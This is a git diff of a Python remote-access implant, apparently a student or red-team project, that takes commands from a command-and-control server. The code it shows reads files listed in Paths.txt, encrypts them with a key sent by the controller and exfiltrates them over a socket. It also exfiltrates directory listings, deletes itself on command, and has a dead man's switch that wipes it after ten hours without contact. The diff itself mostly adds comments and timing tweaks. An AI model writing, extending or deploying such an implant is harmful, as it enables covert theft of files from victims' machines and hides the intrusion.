@@ -46,10 +46,12 @@ def send_exfil(data):
     except:
         print("Error")
 
+#function to self destruct
 def self_destruct():
     remove(argv[0])
     sys.exit()
 
+#Dead man's switch to auto delete after 10 hours of running with no contact from the C2
 def check_time(start_time):
     if(start_time == 0):
         start_time = round(time.time() * 1000)
@@ -62,7 +64,7 @@ def check_time(start_time):
 
 # Create a TCP/IP socket for the victim implant
 implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# Bind the socket to the port and listen
+# Bind the socket to the port 10000 and listen
 implant_server_address = ('localhost', 10000)
 implant_socket.bind(implant_server_address)
 implant_socket.listen(1)
@@ -71,9 +73,11 @@ start_time = 0
 while(True):
     #dead man's switch
     check_time(start_time)
-    
+
+    #recieve the command from the c2
     command = recieve_command().decode("utf-8")
     print("Recieved Command: ", command)
+    #command is always the first part of the message
     comm = command.split(";")[0]
 
     #append to paths
@@ -90,7 +94,9 @@ while(True):
 
     #exfil paths
     if(comm == "2e"):
+        #Paths.txt contains the areas we are interested in exfiltrating
         file1 = open('Paths.txt', 'r')
+        #Line by line each path
         Lines = file1.readlines()
         file1.close()
 
@@ -101,11 +107,12 @@ while(True):
         print("Connecting to Socket")
         c2_socket.connect(c2_server_address)
 
-        #rsa key
+        #rsa key construction
         n = int(command.split(";")[1])
         e = int(command.split(";")[2])
         pubkey = rsa.PublicKey(n,e)
         
+        #for each file in the exfil paths
         for line in Lines:
             #exfil the file for each location in Lines
             cur_file = open(line.replace("\n", ""), 'r')
@@ -114,11 +121,14 @@ while(True):
             file_title = "------" + line.replace("\n", "") + "------\n"
             enc = rsa.encrypt(file_title.encode('utf8'), pubkey)
             send_exfil(enc)
+            #for each line of the file we are interested in
             for c in cur_file_lines:
                 #encrypt the content before sending it back
                 enc = rsa.encrypt(c.encode('utf8'), pubkey)
                 send_exfil(enc)
-                time.sleep(1)
+                #prevents the overlapping of decrypt outputs in C2
+                time.sleep(0.3)
+            #close the file
             cur_file.close()
             
         #attempt to close socket
@@ -130,7 +140,7 @@ while(True):
         except:
             print("error")
     
-    #exfil paths
+    #Perform oswalk on specified directory
     if(comm == "2w"):
         # Create a TCP/IP socket
         c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -139,32 +149,40 @@ while(True):
         print("Connecting to Socket")
         c2_socket.connect(c2_server_address)
 
+        #directory of interest
         directory = command.split(";")[1]
-        print(directory)
-        #rsa key
+
+        #rsa key construction
         n = int(command.split(";")[2])
         e = int(command.split(";")[3])
         pubkey = rsa.PublicKey(n,e)
         
+        #directory, subdirectories, files in that directory = oswalk
         _, directory_walk, file_walk = next(os.walk(directory))
 
+        #send the section title
         enc = rsa.encrypt('-----Files-----'.encode('utf8'), pubkey)
         send_exfil(enc)
-        time.sleep(0.5)
+        time.sleep(0.3)
+
+        #send each file in the walk
         for w in file_walk:
             #encrypt the content before sending it back
             enc = rsa.encrypt(w.encode('utf8'), pubkey)
             send_exfil(enc)
-            time.sleep(0.5)
+            time.sleep(0.3)
         
+        #Send the section title
         enc = rsa.encrypt('-----Immediate Subdirectories-----'.encode('utf8'), pubkey)
         send_exfil(enc)
-        time.sleep(0.5)
+        time.sleep(0.3)
+
+        #send each subdirectory to the folder
         for w in directory_walk:
             #encrypt the content before sending it back
             enc = rsa.encrypt(w.encode('utf8'), pubkey)
             send_exfil(enc)
-            time.sleep(0.1)
+            time.sleep(0.3)
             
         #attempt to close socket
         try:
@@ -175,7 +193,7 @@ while(True):
         except:
             print("error")
 
-
+    #self destruct
     if(comm == "1"):
         #self destruct
         self_destruct()
